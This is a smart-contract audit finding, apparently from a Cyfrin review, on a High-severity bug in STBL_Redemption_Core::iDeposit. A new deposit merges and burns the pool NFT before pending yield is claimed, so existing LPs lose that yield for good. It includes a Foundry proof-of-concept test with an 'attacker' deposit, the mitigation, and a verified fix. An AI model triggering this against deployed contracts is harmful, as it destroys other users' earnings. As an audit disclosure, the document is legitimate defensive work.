---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-06-17-cyfrin-stbl-ess-v2-0-1-2
ingested_at: '2026-08-23T05:04:32Z'
protocol_category: []
published_at: '2026-06-17T00:00:00Z'
related_swc: []
severity: High
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-17-cyfrin-stbl-ess-v2.0.md
tags:
- firm:cyfrin
- report:2026-06-17-cyfrin-stbl-ess-v2-0
title: Pending LP yield permanently destroyed in `STBL_Redemption_Core::iDeposit`
  due to missing call to `STBL_Redemption_Core::iClaimYield` before pool NFT is merged
  and burned
vuln_class: []
---

# Pending LP yield permanently destroyed in `STBL_Redemption_Core::iDeposit` due to missing call to `STBL_Redemption_Core::iClaimYield` before pool NFT is merged and burned

_Section severity (from Solodit section header): High_  
_Audit firm: Cyfrin_  
_Source report: [2026-06-17-cyfrin-stbl-ess-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-17-cyfrin-stbl-ess-v2.0.md)_

---

**Description:** `STBL_Redemption_Core` implements a liquidity pool where LPs deposit YLD NFTs and earn yield distributed from an external `YieldDistributor`. The yield accounting uses a global `rewardIndex` that increases whenever `STBL_Redemption_Core::iClaimYield` is called. **The protocol's correctness** relies on flushing all pending yield from the `YieldDistributor` into `rewardIndex` *before* any operation that changes the pool NFT or `totalSupply`.

`STBL_Redemption_Core::iDeposit` never calls `STBL_Redemption_Core::iClaimYield` before updating state. It first snapshots the new depositor's `rewardIndex` checkpoint via `_updateRewards(msg.sender)`, then calls `spliter.merge(NFTID, _id)` to fold the incoming NFT into the pool, and finally increments `totalSupply`:

```solidity
function iDeposit(uint256 _id) internal {
    _updateRewards(msg.sender);           // snapshot at stale rewardIndex — BUG
    // ...
    NFTID = spliter.merge(NFTID, _id);   // burns old NFTID
    userData[msg.sender].stableValueNet += MetaData.stableValueNet;
    totalSupply += MetaData.stableValueNet;
}
```

The merge operation inside `STBL_YLD_SplitMerge::merge` calls `YLD.burn(oldNFTID)` and then `disableYield(oldNFTID)`, which snapshots any pending distributor yield into `stakingData[oldNFTID].earned`. **Because `oldNFTID` is already burned, `distributor.claim(oldNFTID)` subsequently reverts on `YLD.ownerOf(oldNFTID)`, making that earned balance permanently inaccessible**. The merged NFT starts with a clean yield slate, and `STBL_Redemption_Core::iClaimYield` on it returns zero for the period before the merge.

Attack Details:
1. Pool state: `totalSupply = T`, `NFTID = N`, `rewardIndex = R`. `YieldDistributor` holds `Y` yield units for NFT `N`, unclaimed.
2. New depositor calls `deposit`. `iDeposit` runs `_updateRewards(depositor)`: depositor's `rewardIndex` snapshot = `R`.
3. `merge(N, newNFT)` is called: `YLD.burn(N)` destroys NFT `N`; `disableYield(N)` moves `Y` into `stakingData[N].earned`.
4. `NFTID` is updated to the merged NFT `M`. `M` starts with zero yield history.
5. `STBL_Redemption_Core::iClaimYield` (called any time later): `distributor.claim(M)` returns 0 because `M` has no accrued yield.
6. `Y` remains in `stakingData[N].earned` forever — unreachable because `claim(N)` reverts on `ownerOf(N)` for a burned NFT.

**Impact:** The net result is that **every new LP deposit after the first destroys 100% of all pending unclaimed yield** from the pool. All accumulated yield is destroyed at the moment of a new deposit. Anyone can trigger this inadvertently or deliberately; no privileged role is required.

**Proof of Concept:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Helper} from "./helper.t.sol";

import {STBL_YLD_SplitMerge} from "../contracts/splitter/STBL_YLD_SplitMerge.sol";
import {STBL_Redemption} from "../contracts/redemption/STBL_Redemption.sol";
import {STBL_Redemption_Core} from "../contracts/redemption/STBL_Redemption_Core.sol";

import {STBL_PT1_Issuer} from "@stbl-protocol/stbl-contracts-evm-asset-type1/contracts/issuers/STBL_PT1_Issuer.sol";
import {STBL_T1_YieldDistributor} from "@stbl-protocol/stbl-contracts-evm-asset-type1/contracts/yielddistributor/STBL_T1_YieldDistributor.sol";
import {STBL_TestToken} from "@stbl-protocol/stbl-contracts-evm-asset-type1/contracts/test/STBL_TestToken.sol";
import {STBL_TestOracle} from "@stbl-protocol/stbl-contracts-evm-asset-type1/contracts/test/STBL_TestOracle.sol";
import {STBL_T1_Vault} from "@stbl-protocol/stbl-contracts-evm-asset-type1/contracts/vault/STBL_T1_Vault.sol";

import "@stbl-protocol/stbl-contracts-evm-core/contracts/lib/STBL_Structs.sol";

// ─────────────────────────────────────────────────────────────────────────────
//  Thin wrapper that exposes internal state for test assertions only.
//  Production users interact with STBL_Redemption, not this contract.
// ─────────────────────────────────────────────────────────────────────────────
contract InspectableRedemption3 is STBL_Redemption {
    constructor(
        address _register,
        address _splitter,
        uint256 _assetID
    ) STBL_Redemption(_register, _splitter, _assetID) {}

    function getUserData(
        address _user
    )
        external
        view
        returns (uint256 stableValueNet, uint256 rewardIdx, uint256 earned)
    {
        RedepmtionStruct memory d = userData[_user];
        return (d.stableValueNet, d.rewardIndex, d.earned);
    }

    function getTotalSupply() external view returns (uint256) {
        return totalSupply;
    }

    function getNFTID() external view returns (uint256) {
        return NFTID;
    }

    function getRewardIndex() external view returns (uint256) {
        return rewardIndex;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
//  PoC Test Suite
//
//  Vulnerability: iDeposit() calls _updateRewards(msg.sender) to snapshot the
//  depositor's rewardIndex BEFORE calling iClaimYield(). This means any yield
//  that has accrued in the YieldDistributor since the last claimYield() call is
//  not pulled into rewardIndex before the new LP's baseline is set.
//
//  Merge interaction: When a new LP deposits, iDeposit() merges the pool NFT
//  with the incoming NFT via splitMerge.merge(). The merge calls:
//    disableYield(oldNFTID) -> distributor._updateRewards(oldNFTID) snaps earned
//    enableYield(newMergedNFT) -> new NFT starts with zero earned
//  Because the old NFTID is burned by the merge, distributor.claim(oldNFTID)
//  can never be called again. Any yield that was pending in the distributor for
//  the old NFTID is permanently lost — it lands in stakingData[oldNFTID].earned
//  but is inaccessible since the NFT no longer exists.
//
//  Net impact: Every time a new LP calls deposit(), ALL pending (unclaimed) yield
//  in the distributor is permanently destroyed — existing LPs receive nothing for
//  the period before the new deposit.
// ─────────────────────────────────────────────────────────────────────────────
contract YieldDestruction_PoC is Helper {
    // Contracts under test
    STBL_YLD_SplitMerge public splitMerge;
    InspectableRedemption3 public redemption;

    uint256 constant ASSET_SLOT = 1;
    uint256 constant DEPOSIT = 10_000 * 1e18;

    uint256 public assetRegID;

    function setUp() public override {
        super.setUp();

        deployAsset(ASSET_SLOT, AssetType.PT1);
        assetRegID = getAssetRegistryId(ASSET_SLOT);

        vm.startPrank(admin);

        // Fund user1 (existing LP) and user2 (attacker) with underlying tokens
        STBL_TestToken(getAssetToken(ASSET_SLOT)).mint(user1);
        STBL_TestToken(getAssetToken(ASSET_SLOT)).mint(user1);
        STBL_TestToken(getAssetToken(ASSET_SLOT)).mint(user2);
        STBL_TestToken(getAssetToken(ASSET_SLOT)).mint(user2);

        // Deploy SplitMerge, grant MINTER_ROLE on YLD and SPLITTER_ROLE on registry
        splitMerge = new STBL_YLD_SplitMerge(address(registry));
        yld.grantRole(yld.MINTER_ROLE(), address(splitMerge));
        registry.grantRole(keccak256("SPLITTER_ROLE"), address(splitMerge));

        // Deploy the redemption contract (wrapped for state inspection)
        redemption = new InspectableRedemption3(
            address(registry),
            address(splitMerge),
            assetRegID
        );

        vm.stopPrank();
    }

    // Issue a YLD NFT to `_user` by depositing `_amount` via the PT1 Issuer.
    function _issueNFT(
        address _user,
        uint256 _amount
    ) internal returns (uint256 nftId) {
        vm.startPrank(_user);
        STBL_TestToken(getAssetToken(ASSET_SLOT)).approve(
            getAssetVault(ASSET_SLOT),
            _amount
        );
        nftId = STBL_PT1_Issuer(getAssetIssuer(ASSET_SLOT)).deposit(_amount);
        vm.stopPrank();
    }

    /// @notice PoC: iDeposit() missing iClaimYield() — pending yield permanently destroyed on every new deposit
    /// Title:    iDeposit() missing iClaimYield() call before _updateRewards() checkpoint
    /// Affected: STBL_Redemption_Core.iDeposit() (lines 121-135)
    /// Impact:   All yield accrued since the last claimYield() call is permanently destroyed each time a
    ///           new LP deposits. The pool NFT is merged (burned), trapping pending distributor yield in
    ///           stakingData[oldNFTID].earned — unclaimable forever. Existing LPs lose 100% of unclaimed
    ///           yield with every new deposit.
    /// Author:   0xStalin
    function test_poc_yieldDestruction() public {
        address attacker = user2;
        address assetToken = getAssetToken(ASSET_SLOT);
        address distributor = getAssetYieldDistributor(ASSET_SLOT);

        // == [ Phase 1: user1 (existing LP) deposits ] ==

        uint256 nft1 = _issueNFT(user1, DEPOSIT);
        uint256 nft1StableValueNet = yld.getNFTData(nft1).stableValueNet;

        vm.startPrank(user1);
        yld.approve(address(redemption), nft1);
        redemption.deposit(nft1);
        vm.stopPrank();

        uint256 poolNFTID_before = redemption.getNFTID();

        console.log("--- Phase 1: user1 deposits ---");
        console.log("user1 stableValueNet in pool:", nft1StableValueNet);
        console.log("Pool NFTID after user1 deposit:", poolNFTID_before);
        console.log("Pool totalSupply:", redemption.getTotalSupply());
        console.log("Pool rewardIndex:", redemption.getRewardIndex());

        // == [ Phase 2: Yield accrues in the distributor for pool NFT ] ==

        // Advance time past the yieldDuration lock so distributeYield() succeeds
        vm.warp(block.timestamp + 10_000_001);
        vm.roll(block.number + 1);

        vm.startPrank(admin);
        STBL_TestOracle(getAssetOracle(ASSET_SLOT)).setPrice();
        STBL_T1_Vault(getAssetVault(ASSET_SLOT)).distributeYield();
        vm.stopPrank();

        // Yield now sits in the YieldDistributor for poolNFTID_before.
        uint256 pendingYieldInDistributor = STBL_T1_YieldDistributor(distributor)
            .calculateRewardsEarned(poolNFTID_before);

        console.log("--- Phase 2: Yield accrued in distributor ---");
        console.log("Pending yield in distributor for pool NFT:", pendingYieldInDistributor);
        console.log("Pool rewardIndex (unchanged - claimYield not called):", redemption.getRewardIndex());

        // Sanity check: yield was actually generated
        assertGt(
            pendingYieldInDistributor,
            0,
            "pre-condition: distributor must have pending yield before attacker deposits"
        );

        // == [ Phase 3: Attacker deposits WITHOUT anyone calling claimYield() first ] ==
        //
        // Root cause: iDeposit() calls _updateRewards(attacker) to snapshot
        //   attacker.rewardIndex = rewardIndex (still 0 — stale).
        // Then merge(poolNFTID_before, nft_attacker) is called:
        //   - disableYield(poolNFTID_before): distributor._updateRewards(poolNFTID_before)
        //     moves pendingYieldInDistributor into stakingData[poolNFTID_before].earned
        //   - YLD.burn(poolNFTID_before)  <-- NFT destroyed; claim(poolNFTID_before) now impossible
        //   - enableYield(mergedNFT): fresh state, earned = 0
        // The pending yield Y is permanently locked in stakingData[poolNFTID_before].earned.

        uint256 nft_attacker = _issueNFT(attacker, DEPOSIT);

        vm.startPrank(attacker);
        yld.approve(address(redemption), nft_attacker);
        redemption.deposit(nft_attacker);
        vm.stopPrank();

        uint256 poolNFTID_after = redemption.getNFTID();

        console.log("--- Phase 3: Attacker deposits (bug triggered) ---");
        console.log("Attacker deposited NFT ID:", nft_attacker);
        console.log("Pool NFTID before merge:", poolNFTID_before);
        console.log("Pool NFTID after merge (new merged NFT):", poolNFTID_after);
        console.log("Pool totalSupply after attacker deposit:", redemption.getTotalSupply());
        console.log("Pool rewardIndex after attacker deposit (still 0):", redemption.getRewardIndex());

        // The pool NFT changed — old NFTID was burned during merge
        assertTrue(
            poolNFTID_after != poolNFTID_before,
            "post-deposit: pool NFTID must have changed (merge occurred)"
        );

        // == [ Phase 4: claimYield() called — yields nothing because merged NFT is fresh ] ==

        // The merged NFT has no accumulated yield. The pending yield from the old NFT
        // is trapped in stakingData[poolNFTID_before].earned and is permanently inaccessible.
        uint256 balBefore = STBL_TestToken(assetToken).balanceOf(address(redemption));
        redemption.claimYield();
        uint256 balAfter = STBL_TestToken(assetToken).balanceOf(address(redemption));
        uint256 yieldRecoveredByClaimYield = balAfter - balBefore;

        // Verify yield for the new merged NFT (should be 0 — started fresh after merge)
        uint256 pendingYieldMergedNFT = STBL_T1_YieldDistributor(distributor)
            .calculateRewardsEarned(poolNFTID_after);

        console.log("--- Phase 4: claimYield() called ---");
        console.log("Yield recovered by claimYield() (expected 0):", yieldRecoveredByClaimYield);
        console.log("Pool rewardIndex after claimYield:", redemption.getRewardIndex());
        console.log("Pending yield for merged NFTID (should be 0):", pendingYieldMergedNFT);
        console.log(
            "Yield permanently stuck in distributor for old NFTID:",
            STBL_T1_YieldDistributor(distributor).calculateRewardsEarned(poolNFTID_before)
        );

        // == [ Phase 5: Both users claim — user1 receives nothing ] ==

        uint256 user1BalBefore = STBL_TestToken(assetToken).balanceOf(user1);
        vm.prank(user1);
        uint256 user1Claimed = redemption.claim();
        uint256 user1BalAfter = STBL_TestToken(assetToken).balanceOf(user1);

        uint256 attackerBalBefore = STBL_TestToken(assetToken).balanceOf(attacker);
        vm.prank(attacker);
        uint256 attackerClaimed = redemption.claim();
        uint256 attackerBalAfter = STBL_TestToken(assetToken).balanceOf(attacker);

        console.log("--- Phase 5: Users claim ---");
        console.log("user1 claimed:", user1Claimed);
        console.log("user1 token balance delta:", user1BalAfter - user1BalBefore);
        console.log("attacker claimed:", attackerClaimed);
        console.log("attacker token balance delta:", attackerBalAfter - attackerBalBefore);
        console.log("Yield that should have gone to user1:", pendingYieldInDistributor);
        console.log("user1 yield loss:", pendingYieldInDistributor - user1Claimed);

        // == [ Verify Impact ] ==

        // Primary assertion: user1 receives ZERO yield despite being the sole LP
        // during the entire yield generation period.
        assertEq(
            user1Claimed,
            0,
            "PoC: user1 received zero yield (pending yield destroyed by deposit)"
        );

        // The pending yield is permanently trapped in burned NFTID storage — not merely lost, but inaccessible forever.
        assertEq(
            STBL_T1_YieldDistributor(distributor).calculateRewardsEarned(poolNFTID_before),
            pendingYieldInDistributor,
            "PoC: yield is permanently trapped in burned NFTID storage"
        );

        // The attacker also receives nothing — the yield was destroyed, not captured.
        assertEq(
            attackerClaimed,
            0,
            "PoC: attacker received zero (yield was destroyed, not redirected)"
        );

        // claimYield() recovered nothing because the merged NFT started fresh.
        assertEq(
            yieldRecoveredByClaimYield,
            0,
            "PoC: claimYield() recovered zero tokens - yield is permanently trapped in old NFTID"
        );

        console.log("[+] EXPLOIT CONFIRMED: Pending yield permanently destroyed on iDeposit() - user1 lost", pendingYieldInDistributor, "tokens of yield that can never be claimed");
    }
}
```

**Recommended Mitigation:** Call `STBL_Redemption_Core::iClaimYield` at the start of `iDeposit`, before `_updateRewards(msg.sender)` and before `merge`, guarded by `if (totalSupply > 0)` to avoid division by zero on the first deposit. This ensures all pending yield is flushed into `rewardIndex` at the pre-deposit `totalSupply` before the pool NFT is merged and burned, making the yield claimable by existing LPs at their correct shares.


**STBL:** Fixed in commit [49b2ac2](https://github.com/USD-Pi-Protocol/stbl-contracts-evm-redemptions/commit/49b2ac21279c392f2d57b4da678903d05d79dcf3).

**Cyfrin:** Verified. `iDeposit` now calls `iClaimYield` at the start of the function, guarded by `totalSupply > 0` to skip the first deposit, and before both the reward checkpoint and the merge. This ensures all pending distributor yield is flushed into `rewardIndex`  at the current pool size before the pool NFT is burned by the merge, making the accrued yield claimable by existing LPs at their correct proportional shares.
